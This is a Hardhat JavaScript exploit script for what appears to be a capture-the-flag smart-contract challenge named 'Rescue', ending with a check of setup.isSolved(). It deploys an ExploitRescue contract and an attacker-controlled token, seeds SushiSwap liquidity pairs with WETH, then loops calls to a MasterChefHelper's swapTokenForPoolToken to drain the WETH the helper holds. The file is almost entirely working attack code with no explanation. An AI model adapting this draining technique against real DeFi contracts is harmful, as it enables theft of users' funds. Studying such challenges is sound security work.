const hre = require("hardhat");

async function main() {
  [owner, user1] = await ethers.getSigners();
  const Setup = await ethers.getContractFactory("contracts/Rescue/Setup.sol:Setup");
  const setup = await Setup.attach(`0x62fCafDA742BEc34d70eE921F31e3fAb5574e37C`);
  
  const erc20ABI = [
      "function balanceOf(address owner) view returns (uint256)",
      "function decimals() view returns (uint8)",
      "function symbol() view returns (string)",
      "function transfer(address to, uint amount) returns (bool)",
      'function approve(address, uint) external',
      "event Transfer(address indexed from, address indexed to, uint amount)"
  ];

  const mcHelperAddy = await setup.mcHelper();
  console.log(mcHelperAddy);

  const MCHelper = await ethers.getContractFactory("MasterChefHelper");
  const mcHelper = await MCHelper.attach(mcHelperAddy);
  const balance = await ethers.provider.getBalance(owner.address);
  console.log('balance',ethers.utils.formatEther(balance));

  MasterChefLikeABI = ['function poolInfo(uint256 id) external returns (address lpToken,uint256 allocPoint,uint256 lastRewardBlock,uint256 accSushiPerShare)'];
  const mcChef = await new ethers.Contract(`0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd`, MasterChefLikeABI, owner);

  const ExploitRescue = await ethers.getContractFactory("ExploitRescue");
  exploit = await ExploitRescue.deploy();

  await exploit.getPool(0);

  const lpToken0 = await exploit.lpToken();
  const tokenA0 = await exploit.tokenOut0();
  const tokenB0 = await exploit.tokenOut1();
  console.log('lpToken0',lpToken0,tokenA0,tokenB0);
  const lp0 = await new ethers.Contract(lpToken0, erc20ABI, owner);
  const lp0balance = await lp0.balanceOf(owner.address);
  console.log('lp0bal',lp0balance.toNumber());
  await exploit.getPool(100);
  const lpToken1 = await exploit.lpToken();
  const tokenA1 = await exploit.tokenOut0();
  const tokenB1 = await exploit.tokenOut1();
  console.log('lpToken1',lpToken1,tokenA1,tokenB1);
  const poolLength = await exploit.poolLength();
  console.log(poolLength.toNumber());
  await exploit.getPool(poolLength.toNumber()-1);
  const lpToken2 = await exploit.lpToken();
  const tokenA2 = await exploit.tokenOut0();
  const tokenB2 = await exploit.tokenOut1();
  console.log('lpToken2',lpToken2,tokenA2,tokenB2);
  const lp2 = await new ethers.Contract(lpToken2, erc20ABI, owner);
  const lp2balance = await lp2.balanceOf(owner.address);
  console.log('lp2bal',lp2balance.toNumber());

  const WethABI = ["function balanceOf(address owner) view returns (uint256)",'function deposit() external payable','function approve(address, uint) external',"function transfer(address to, uint amount) returns (bool)"];
  const wethAddress = `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2`;
  const weth = await new ethers.Contract(wethAddress, WethABI, owner);
  const depositAmount = ethers.utils.parseEther('100');
  const amount = ethers.utils.parseEther('10');
  await weth.deposit({value: depositAmount});
  
 

  //await mcHelper.swapTokenForPoolToken(poolLength.toNumber()-1, tokenInAddress, tokenInBalance, 0);

//  await exploit.addPool(`0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2`);
//  const poolLength2 = await exploit.poolLength();
//  console.log(poolLength2.toNumber());

  const uniABI = ['function addLiquidity(address tokenA,address tokenB,uint amountADesired,uint amountBDesired,uint amountAMin,uint amountBMin,address to,uint deadline) external returns (uint amountA, uint amountB, uint liquidity)'];
  const uniAddress = `0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F`;
  const uni = await new ethers.Contract(uniAddress, uniABI, owner);

  const Token = await ethers.getContractFactory("Token");
  token = await Token.deploy();

  await weth.approve(uniAddress, amount);
  await token.approve(uniAddress, amount);
  await uni.addLiquidity(wethAddress,token.address,amount,amount,0,0,owner.address, '9999999999999999999');

  await weth.approve(exploit.address, amount);
  await exploit.swap(wethAddress, tokenA1, amount);
  const tokB = await new ethers.Contract(tokenA1, erc20ABI, owner);

  await exploit.withdraw(tokenA1);

  await token.approve(uniAddress, amount);
  //const tokBbal = await tokB.balanceOf(owner.address);
  //console.log('tokBbal',tokBbal);
  await token.approve(uniAddress, amount);
  await tokB.approve(uniAddress, amount);
  
  await uni.addLiquidity(tokenA1,token.address,amount,amount,0,0,owner.address, '9999999999999999999');
  const mcBal1 = await weth.balanceOf(mcHelperAddy);
  for (let index = 0; index < 100; index++) {
    await token.approve(mcHelperAddy, depositAmount);
    await mcHelper.swapTokenForPoolToken(100, token.address, depositAmount, 0);
    const mcBal = await weth.balanceOf(mcHelperAddy);
    console.log('mcBal',ethers.utils.formatEther(mcBal));
  }
  const mcBal2 = await weth.balanceOf(mcHelperAddy);
  console.log('mcBal',ethers.utils.formatEther(mcBal1),ethers.utils.formatEther(mcBal2));

  //await token.approve(mcHelperAddy, amount);
  //await weth.deposit({value: amount});
  //await weth.approve(exploit.address, amount);
  //const tokenInAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
  //const tok = await new ethers.Contract(tokenInAddress, erc20ABI, owner);

  //await weth.approve(exploit.address, amount);
  //await exploit.swap(wethAddress, tokenInAddress, amount);
  //await tok.approve(mcHelperAddy,1000);
  //await mcHelper.swapTokenForPoolToken(0, tokenInAddress, 1000, 0);

  const solved = await setup.isSolved();
  console.log('Solved',solved);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
